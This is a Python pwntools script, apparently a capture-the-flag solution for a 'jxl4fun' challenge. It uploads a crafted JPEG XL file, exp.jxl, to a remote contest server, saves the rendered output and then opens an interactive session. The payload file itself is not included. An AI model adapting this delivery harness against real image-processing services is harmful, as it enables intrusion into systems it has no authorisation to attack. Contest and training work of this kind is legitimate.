#! /usr/bin/env python3

import socket
import os
os.chdir(os.path.dirname(os.path.abspath(__file__)))


TARGET_FILE = '../exp.jxl'
#TARGET_FILE = '../test.jxl'

from pwn import *

context.log_level = 'debug'

def main():
    with open(TARGET_FILE, 'rb') as f:
        data = f.read()

    r = remote('jxl4fun-yvpde3iuhcm7q.shellweplayaga.me', 18180)

    r.recvuntil(b'please')

    r.sendline(b'ticket{...}')

    r.sendline(str(len(data)))
    r.recvuntil(b'your art')

    for i in range(0, len(data), 0x1000):
        r.send(data[i:i+0x1000])
        sleep(0.1)

    r.recvuntil(b'Rendered Art Size')
    r.recvuntil(b': ')
    size = int(r.recvline())
    print(f'size: {size}')

    data = b''
    while len(data) < size:
        data += r.recv(min(size - len(data), 0x1000))

    with open('out.png', 'wb') as f:
        f.write(data)

    r.interactive()


if __name__ == '__main__':
    main()
    
    

    

